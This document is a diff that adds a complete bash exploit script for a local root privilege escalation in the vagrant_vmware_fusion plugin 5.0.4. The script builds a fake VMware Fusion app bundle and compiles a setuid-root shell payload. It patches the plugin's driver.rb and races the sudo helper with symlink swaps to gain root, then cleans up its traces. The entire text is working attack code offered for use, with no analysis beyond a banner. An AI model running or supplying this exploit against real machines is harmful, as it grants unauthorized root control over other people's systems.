@@ -1,0 +1,172 @@
+#!/bin/bash
+echo
+echo "#########################################################"
+echo "# vagrant_vmware_fusion plugin 5.0.4 local root privesc #"
+echo "# by m4rkw - https://m4.rkw.io/blog.html                #"
+echo "#########################################################"
+echo "# Note: only works when VMWare Fusion is not installed. #"
+echo "#########################################################"
+echo
+
+cleanup() {
+  exec 2> /dev/null
+  killall -9 vagrant 1>/dev/null 2>/dev/null
+  kill -9 `ps auxwww |egrep '\/vagrant up$' |xargs -L1 |cut -d ' ' -f2` &>/dev/null
+  exec 2> /dev/tty
+  cd
+  rm -rf .vagrant_vmware_fusion_504_exp
+  rm -rf /Applications/VMware\ Fusion.app
+  mv -f ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb
+}
+
+if [ -e "/Applications/VMware Fusion.app" ] ; then
+  echo "Fusion is installed, not exploitable."
+  exit 1
+fi
+
+echo "setting up fake app directory..."
+
+mkdir /Applications/VMware\ Fusion.app
+if [ ! $? -eq 0 ] ; then
+  echo "Failed to create /Applications/VMware Fusion.app."
+  exit 1
+fi
+
+mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
+
+touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+
+cat > /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx <<EOF
+#!/bin/bash
+echo 1>&2
+echo "VMware Fusion Information:" 1>&2
+echo "VMware Fusion 10.0.1 build-6754183 Release" 1>&2
+echo
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
+
+cat > /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack <<EOF
+#!/bin/bash
+chown root:wheel /tmp/vvp_504
+chmod 4755 /tmp/vvp_504
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack
+
+echo "compiling payload..."
+
+cat > /tmp/vvp_504.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","rm -f /tmp/vvp_504; /bin/bash",NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_504 /tmp/vvp_504.c
+rm -f /tmp/vvp_504.c
+
+cd
+mkdir .vagrant_vmware_fusion_504_exp
+cd .vagrant_vmware_fusion_504_exp
+
+echo "writing dummy vagrantfile ..."
+
+cat > vagrantfile <<EOF
+Vagrant.configure('2') do |config|
+  config.vm.box = 'envimation/ubuntu-xenial'
+end
+EOF
+
+echo "patching driver.rb..."
+
+if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+  mv ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig
+fi
+
+cat > ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb <<EOF
+load File.dirname(__FILE__) + "/driver.rb.orig"
+
+Dir.chdir("/Applications/VMware Fusion.app/Contents/Library/")
+
+\`ln -sf /bin/ls vmnet-cli\`
+
+Thread.new do
+  system("/Users/#{ENV["USER"]}/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status")
+end
+
+sleep 1.0/ENV["DELAY"].to_f
+
+\`ln -sf vmnet-cli.hack vmnet-cli\`
+
+exit 0
+EOF
+
+echo
+echo "attempting to exploit the race condition..."
+echo "(the more loaded the system the longer this will take)"
+echo
+
+echo -n "racing: "
+
+success=0
+i=0
+delay=80
+previous_dir=0
+gap=5
+max_attempts=250
+
+while :
+do
+  export DELAY="$delay"
+  printf "%x" $DELAY
+
+  x=`vagrant up 2>&1`
+
+  if [ "`echo "$x" |grep 'illegal option'`" != "" ] ; then
+    if [ $previous_dir -eq 2 -a $gap -gt 1 ] ; then
+      gap=$((gap-1))
+    fi
+    delay=$((delay+$gap))
+    previous_dir=1
+  elif [ "`echo "$x" |grep 'detected invalid ownership'`" != "" ] ; then
+    if [ $previous_dir -eq 1 -a $gap -gt 1 ] ; then
+      gap=$((gap-1))
+    fi
+    delay=$((delay-$gap))
+    previous_dir=2
+  else
+    r=`ls -la /tmp/vvp_504 |grep -- '-rwsr-xr-x  1 root  wheel'`
+    if [ "$r" != "" ] ; then
+      success=1
+      break
+    fi
+  fi
+
+  i=$((i+1))
+
+  if [ $i -eq $max_attempts ] ; then
+    break
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo
+  echo
+  echo "exploit failed."
+  exit 1
+fi
+
+echo
+echo
+echo "SUCCESS!"
+cd
+/tmp/vvp_504
